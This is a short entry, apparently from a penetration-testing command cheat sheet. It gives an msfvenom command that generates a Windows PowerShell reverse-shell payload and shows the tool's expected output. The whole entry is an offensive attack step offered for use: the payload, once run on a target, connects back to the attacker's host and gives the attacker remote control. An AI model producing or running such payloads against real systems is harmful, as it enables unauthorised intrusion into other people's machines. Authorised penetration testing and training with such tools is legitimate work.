---
id: 6f80a940-3858-4577-85c7-363040543dd1
name: msfvenom Powershell Script Reverse Shell
type: command
executor: null
data: msfvenom -p cmd/windows/reverse_powershell LHOST=$LOCAL_IP LPORT=$LOCAL_PORT
  -f raw -o msf.ps
output: 'root@hackers:~# msfvenom -p cmd/windows/reverse_powershell LHOST=172.16.162.187
  LPORT=1337 -f raw -o msf.ps

  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

  [-] No arch selected, selecting arch: cmd from the payload

  No encoder or badchars specified, outputting raw payload

  Payload size: 1227 bytes

  Saved as: msf.ps'
created_at: '2019-09-17T17:39:01.871323+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# msfvenom Powershell Script Reverse Shell

```bash
msfvenom -p cmd/windows/reverse_powershell LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw -o msf.ps
```

## Expected Output

```
root@hackers:~# msfvenom -p cmd/windows/reverse_powershell LHOST=172.16.162.187 LPORT=1337 -f raw -o msf.ps
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1227 bytes
Saved as: msf.ps
```


